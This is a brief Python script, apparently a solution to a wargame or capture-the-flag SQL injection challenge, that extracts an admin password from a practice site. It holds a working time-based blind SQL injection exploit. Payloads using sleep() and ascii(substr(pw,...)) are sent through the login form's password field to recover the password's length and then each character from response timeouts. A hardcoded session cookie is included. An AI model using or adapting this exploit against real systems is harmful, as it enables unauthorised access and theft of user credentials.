#sql injection 3

import requests

url = "https://p.rubiya.kr/sqli3/?"
headers = {'Cookie': 'h4l3v822bccd54d6rv00p8qoq5'}
pw_length=''
for i in range(1, 50):
    query = "' || id != 'guest' and length(pw)={} and sleep(3)#".format(i)
    request = {'id':'admin', 'pw':query}

    try:
        r = requests.post(url, data=request, headers=headers, timeout=3)
        pass
    except:
        print("pw_length : ", i)
        pw_length = i
        break

pw=''
for i in range(1, pw_length+1):
    for j in range(33,127):
        query = "' || id != 'guest' and ascii(substr(pw,{},1))={} and sleep(3)#".format(i,j)
        request = {'id': 'admin', 'pw': query}

        try:
            r = requests.post(url, data=request, headers=headers, timeout=3)
            pass
        except:
            pw += chr(j)
            print("pw : ", pw)
            break
